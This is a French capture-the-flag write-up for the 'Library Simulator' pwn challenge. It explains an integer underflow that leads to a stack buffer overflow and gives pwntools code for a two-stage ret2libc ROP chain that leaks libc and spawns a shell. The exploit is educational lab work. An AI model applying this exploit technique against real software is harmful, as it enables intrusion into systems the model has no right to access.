# pwn - Library Simulator

La vulnérabilité se trouve dans le code qui gère "Borrow a book" et "Return a book". 
```c
unsigned int title_length;
char v5[32];

// [...]
if ( v6 == 'r' )
    {
      printf("Title length: ");
      __isoc99_scanf("%d", &title_length); // [1]
      getchar();
      if ( title_length > 0x1F ) // [2]
      {
LABEL_11:
        puts("The title is too long");
      }
      else
      {
        printf("Title: ");
        read_input(v5, title_length - 1); // [3]
        return_book((__int64)v5);
      }
```

En [1], l'utilisateur entre la taille de son entrée. Le programme vérifie que
la taille est bien inférieure à la taille buffer [2], puis lit `title_length - 1` octets [3].
Il y a un integer overflow au niveau du `read_input` : si `title_lenght` vaut
0, alors `title_length - 1` vaudra 0xffffffff.
Cet integer overflow entraine ainsi un buffer overflow.

```c
void __fastcall read_input(_BYTE *a1, __int64 a2)
{
  _BYTE *v2; // rax
  __int64 n; // [rsp+0h] [rbp-20h]
  char v6; // [rsp+1Fh] [rbp-1h]

  n = a2;
  if ( a2 )
  {
    while ( n-- )
    {
      v6 = getchar();
      if ( v6 == 10 )
      {
        *a1 = 0;
        return;
      }
      v2 = a1++;
      *v2 = v6;
    }
  }
}
```

Le programme ne contient pas de canary et a été compilé sans PIE. Il est donc
possible d'utiliser les gadgets du programme pour la ropchain.
```
[*] './library_simulator'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
```

L'objectif est d'obtenir l'adresse de la libc pour pouvoir exécuter
`system("/bin/sh")`.

La GOT de notre programme contient des pointeurs vers des fonctions de la libc,
il est donc possible de lire ces entrées avec la ropchain pour obtenir
l'adresse de la libc. Il faut ensuite rappeler la fonction `main` de notre
programme pour exécuter une seconde ropchain :
```py
rop = ROP(exe)
rop.call(exe.plt["puts"], [exe.got["puts"]]) # leak libc puts address
rop.call("main") # ret2main

# exploit buffer overflow and execute the ropchain
r.sendlineafter(b"> ", b"b")
r.sendlineafter(b"length: ", b"0")
r.sendlineafter(b"Title: ", b"A"*0x38 + rop.chain())

# read the leak
r.recvuntil(b"not found\n")
leak = r.recvline()[:-1]
libc.address = u64(leak.ljust(8, b"\x00")) - libc.sym["puts"]
```

Maintenant que l'addresse de la libc est connue, il est possible d'appeler la fonction `system` :

```py
rop = ROP(libc)
rop.call(rop.find_gadget(["ret"])) # movaps issue
rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh\x00"))])

r.sendlineafter(b"> ", b"b")
r.sendlineafter(b"length: ", b"0")
r.sendlineafter(b"Title: ", b"A"*0x38 + rop.chain())

r.sendline(b"cat /challenge/flag.txt")
```
